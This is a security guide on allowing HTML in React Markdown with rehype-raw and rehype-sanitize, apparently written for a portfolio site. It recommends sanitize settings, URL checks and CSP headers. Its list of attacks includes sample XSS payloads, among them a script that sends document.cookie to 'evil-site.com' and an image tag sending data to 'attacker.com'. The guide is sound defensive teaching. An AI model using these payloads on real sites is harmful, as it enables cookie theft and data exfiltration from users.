# Security Analysis: rehype-raw and rehype-sanitize

## The Security Challenge

When you allow HTML in markdown content, you open potential security vulnerabilities. Here's what you need to know:

## Without Security Measures (DANGEROUS)

```typescript
// ❌ NEVER DO THIS - Allows any HTML to execute
<ReactMarkdown rehypePlugins={[rehypeRaw]}>
  {userContent}
</ReactMarkdown>
```

### Potential Attacks:

1. **Cross-Site Scripting (XSS)**
   ```html
   <script>
     // Malicious JavaScript could steal user data
     document.location = 'https://evil-site.com/steal?data=' + document.cookie;
   </script>
   ```

2. **Event Handler Injection**
   ```html
   <img src="x" onerror="alert('XSS Attack!')" />
   <div onclick="maliciousFunction()">Click me</div>
   ```

3. **Style-based Attacks**
   ```html
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999;">
     Fake login form to steal credentials
   </div>
   ```

4. **Data Exfiltration**
   ```html
   <img src="https://attacker.com/log?data=sensitive-info" />
   ```

## How rehype-sanitize Protects You

### Current Safe Configuration
```typescript
// ✅ SECURE - Your current setup
const sanitizeOptions = {
  ...defaultSchema,
  tagNames: [
    ...(defaultSchema.tagNames || []),
    'img'  // Only allowing img tags beyond defaults
  ],
  attributes: {
    ...defaultSchema.attributes,
    img: ['src', 'alt', 'width', 'height', 'style', 'className', 'class'],
    '*': ['className', 'class', 'style']
  }
};
```

### What This Blocks:

1. **Script Tags**: `<script>` tags are completely removed
2. **Event Handlers**: `onclick`, `onerror`, `onload` etc. are stripped
3. **Dangerous URLs**: `javascript:` URLs in `src` attributes are blocked
4. **Iframe/Object**: Embedding external content is prevented
5. **Form Elements**: `<form>`, `<input>` tags are removed

### What This Allows:

1. **Safe HTML**: `<div>`, `<span>`, `<p>`, `<img>`, etc.
2. **Styling**: CSS through `style` attribute (with limitations)
3. **Classes**: `class` and `className` attributes
4. **Image Attributes**: `src`, `alt`, `width`, `height`

## Security Levels Comparison

### Level 1: No HTML (Most Secure)
```typescript
// Only standard markdown, no HTML tags
<ReactMarkdown>{content}</ReactMarkdown>
```
- ✅ Maximum security
- ❌ No HTML flexibility

### Level 2: Sanitized HTML (Balanced - Your Current Setup)
```typescript
// HTML allowed but sanitized
<ReactMarkdown rehypePlugins={[rehypeRaw, [rehypeSanitize, options]]}>
  {content}
</ReactMarkdown>
```
- ✅ Good security with flexibility
- ✅ Allows safe HTML like images
- ⚠️ Some attack vectors still possible with poor configuration

### Level 3: Raw HTML (Dangerous)
```typescript
// All HTML allowed - NEVER DO THIS with user content
<ReactMarkdown rehypePlugins={[rehypeRaw]}>
  {content}
</ReactMarkdown>
```
- ❌ Maximum vulnerability
- ✅ Complete HTML freedom

## Potential Remaining Risks

Even with sanitization, some risks remain:

### 1. CSS-based Attacks
```html
<!-- Could potentially overlay malicious content -->
<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999;">
  Fake content
</div>
```

### 2. Image-based Tracking
```html
<!-- Could track users or log data -->
<img src="https://tracker.com/pixel.gif?user=123" width="1" height="1" />
```

### 3. Large Content Injection
```html
<!-- Could create very large elements that break layout -->
<div style="width: 10000px; height: 10000px; background: red;"></div>
```

## Enhanced Security Recommendations

### 1. Stricter CSS Sanitization
```typescript
const sanitizeOptions = {
  ...defaultSchema,
  tagNames: [...(defaultSchema.tagNames || []), 'img'],
  attributes: {
    ...defaultSchema.attributes,
    img: ['src', 'alt', 'width', 'height'],
    // Remove 'style' to prevent CSS attacks
    '*': ['className', 'class']
  }
};
```

### 2. URL Validation
```typescript
// In your custom img component
img: ({ src, alt, width, height, ...props }) => {
  // Validate URLs to prevent tracking
  const isValidUrl = (url: string) => {
    try {
      const parsed = new URL(url, window.location.origin);
      // Only allow same-origin or specific domains
      return parsed.origin === window.location.origin || 
             ['https://trusted-cdn.com'].includes(parsed.origin);
    } catch {
      return false;
    }
  };

  if (!isValidUrl(src)) {
    console.warn(`Blocked potentially unsafe image URL: ${src}`);
    return null;
  }

  return <img src={src} alt={alt} width={width} height={height} {...props} />;
}
```

### 3. Content-Security-Policy (CSP)
Add to your `index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
  script-src 'self';
">
```

## For Your Portfolio Use Case

Since you control the markdown content (it's not user-generated), your current setup is **relatively safe**:

### Why Your Setup Is OK:
1. **Controlled Content**: You write all the markdown files
2. **No User Input**: Users can't submit markdown content
3. **Sanitization**: rehype-sanitize provides good protection
4. **Limited Scope**: Only allowing img tags and basic styling

### Best Practices for Your Case:
1. **Code Reviews**: Always review markdown content before deployment
2. **Trusted Sources**: Only use images from trusted domains
3. **Regular Updates**: Keep rehype-sanitize updated for latest security patches
4. **CSP Headers**: Add Content Security Policy headers in production

## Monitoring and Detection

### 1. Console Warnings
Your current setup logs warnings for failed images:
```typescript
onError={() => {
  console.warn(`Failed to load image: ${transformedSrc}`);
}}
```

### 2. Sanitization Reporting
```typescript
// Enhanced logging
const sanitizeOptions = {
  ...defaultSchema,
  // ... your config
};

// Log what gets sanitized
<ReactMarkdown
  rehypePlugins={[
    rehypeRaw,
    [rehypeSanitize, sanitizeOptions]
  ]}
  transformLinkUri={(uri) => {
    console.log('Processing URI:', uri);
    return uri;
  }}
>
```

## Conclusion

Your current setup strikes a good balance between functionality and security for a portfolio site. The main recommendations:

1. ✅ Keep using `rehype-sanitize` (you're doing this)
2. ✅ Limit allowed HTML tags (you're doing this)
3. ⚠️ Consider removing `style` attribute if you don't need complex styling
4. ⚠️ Add CSP headers in production
5. ✅ Continue controlling all markdown content yourself

For a personal portfolio where you control all content, this level of security is appropriate and practical.
